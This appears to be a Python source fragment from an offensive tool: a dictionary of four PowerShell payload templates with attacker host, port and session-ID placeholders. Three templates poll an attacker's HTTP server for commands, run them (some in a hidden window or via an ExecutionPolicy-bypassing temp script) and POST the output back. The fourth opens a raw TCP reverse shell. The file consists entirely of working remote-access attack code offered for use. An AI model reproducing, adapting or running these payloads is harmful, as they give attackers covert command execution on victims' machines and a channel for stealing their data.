payloads = {
    'ps_http': (
        "$LHOST = '{LHOST}'; $LPORT = {LPORT}; $uid = '{UID}'; "
        "powershell -NoP -W Hidden -C \"while($true){$c=(iwr -Uri \\\"http://$LHOST:$LPORT/$($uid.Split('-')[1])\\\" -Headers @{Authorization=$uid} -ErrorAction SilentlyContinue).Content; if($c){$c=$c.Trim(); if($c.ToLower() -eq 'exit'){break} if($c -ne 'None'){$o=try{iex $c 2>&1 | Out-String}catch{$_.ToString()}; iwr -Uri \\\"http://$LHOST:$LPORT/$($uid.Split('-')[0])\\\" -Headers @{Authorization=$uid} -Method POST -Body $o -ErrorAction SilentlyContinue | Out-Null}}; Start-Sleep -Seconds 2}\""
    ),
    'powerShellIEX': (
        '''$s='{LHOST}:{LPORT}';$i='{UID}';$p='http://';while($true){$c=(IRM -UseBasicParsing -Uri "$p$s/$($i.Split('-')[1])" -Headers @{"Authorization"=$i} -ErrorAction SilentlyContinue);if($c){$c=$c.Trim();if($c.ToLower() -eq 'exit'){break}if($c -ne 'None'){$r=try{IEX $c -ErrorAction Stop}catch{$_.ToString()};$r=Out-String -InputObject $r;IRM -Uri "$p$s/$($i.Split('-')[0])" -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($r) -join ' ') -ErrorAction SilentlyContinue | Out-Null}} sleep 0.8}'''
    ),
    'powershell outfile': (
        '''$s='{LHOST}:{LPORT}';$i='{UID}';$p='http://';$f=\"$env:TEMP\\.lhk.ps1\";while($true){$c=(IRM -UseBasicParsing -Uri \"$p$s/$($i.Split('-')[1])\" -Headers @{\"Authorization\"=$i} -ErrorAction SilentlyContinue);if($c){$c=$c.Trim();if($c.ToLower() -eq 'exit'){if(Test-Path $f){rm $f -Force};break}elseif($c -ne 'None'){$c | Out-File -FilePath $f -Encoding ascii -Force;$r=try{powershell -ExecutionPolicy Bypass -File $f 2>&1 | Out-String}catch{$_.ToString()};IRM -Uri \"$p$s/$($i.Split('-')[0])\" -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($r) -join ' ') -ErrorAction SilentlyContinue | Out-Null}} sleep 0.8}'''
    ),
    'powershell#1': (
        '''$LHOST = "{LHOST}"; $LPORT = {LPORT}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()'''
    ),
}
